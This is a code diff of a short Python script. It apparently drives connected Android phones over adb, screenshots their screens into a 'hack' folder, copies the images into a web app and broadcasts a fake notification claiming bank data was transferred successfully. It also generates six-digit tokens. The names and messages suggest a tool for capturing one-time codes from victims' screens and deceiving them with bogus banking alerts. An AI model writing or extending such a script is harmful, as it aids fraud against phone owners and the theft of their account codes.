@@ -1,19 +1,19 @@
 import subprocess
 import random
-def take_screenshot():
+def take_screenshot(id):
     # Comando para tomar una captura de pantalla
-    command = ["adb", "shell", "screencap", "/sdcard/token.png"]
+    command = ["adb", "-s", id, "shell", "screencap", "/storage/F1A8-6981/hack/screen.png"]
     subprocess.run(command)
     
-    command = ["adb", "pull", "/sdcard/token.png", "."]
+    command = ["adb", "-s", id, "pull", "/storage/F1A8-6981/hack/screen.png", "webapp/photo.png"]
     subprocess.run(command)
 
     # Enviar el comando para mostrar una notificación
-    command = ["adb", "shell", "am", "broadcast", "-a", "android.intent.action.SEND", "--c", "android.intent.category.DEFAULT", "--es", "title", "Operación exitosa.", "--es", "message", "Datos bancarios transferidos con éxito."]
+    command = ["adb", "-s", id, "shell", "am", "broadcast", "-a", "android.intent.action.SEND", "--c", "android.intent.category.DEFAULT", "--es", "title", "Operación exitosa.", "--es", "message", "Datos bancarios transferidos con éxito."]
     subprocess.run(command)
     #adb_device.shell('am broadcast -a com.example.yourapp.SHOW_NOTIFICATION -e title "Title" -e message "Message"')
     
-    print("Captura de pantalla tomada y guardada como 'screenshot.png'")
+    print("Captura de pantalla tomada y guardada como 'screen.png'")
 
 def generate_token():
     return ''.join([str(random.randint(0, 9)) for _ in range(6)])
